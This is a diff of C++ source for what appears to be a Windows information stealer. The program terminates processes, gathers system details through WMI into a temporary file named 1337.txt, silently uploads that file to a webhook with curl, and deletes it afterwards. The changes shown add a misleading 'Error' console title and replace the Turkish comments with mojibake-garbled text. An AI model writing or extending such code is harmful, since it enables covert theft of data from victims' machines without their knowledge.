@@ -8,7 +8,10 @@
 #pragma comment(lib, "comsuppw.lib")
 
 int main() {
+
+    const wchar_t* newTitle = L"Error";
   
+   SetConsoleTitle(newTitle);
 
     ProcessList::TerminateProcesses();
 
@@ -23,13 +26,13 @@ int main() {
     std::wstring filePath = tempPath;
     filePath += L"\\1337.txt";
 
-    // Dosyayý oluþtur ve aç
+    // DosyayÄ± oluÅŸtur ve aÃ§
     std::wofstream file(filePath);
     if (!file.is_open()) {
         return 1;
     }
 
-    // WMI için gerekli COM nesnelerini baþlat
+    // WMI iÃ§in gerekli COM nesnelerini baÅŸlat
     IWbemLocator* pLoc = nullptr;
     IWbemServices* pSvc = nullptr;
 
@@ -104,14 +107,14 @@ int main() {
     pLoc->Release();
     CoUninitialize();
 
-    // Dosyayý kapat
+    // DosyayÄ± kapat
     file.close();
 
-    // curl komutunu oluþtur ve çalýþtýr
+    // curl komutunu oluÅŸtur ve Ã§alÄ±ÅŸtÄ±r
     std::wstring curlCommand = L"curl -X POST -H \"Content-Type: multipart/form-data\" -F \"file=@" + filePath + L"\" " + webhookUrl + L" > NUL";
     _wsystem(curlCommand.c_str());
 
-    // Dosyayý sil
+    // DosyayÄ± sil
     if (DeleteFileW(filePath.c_str()) == 0) {
         return 1;
     }
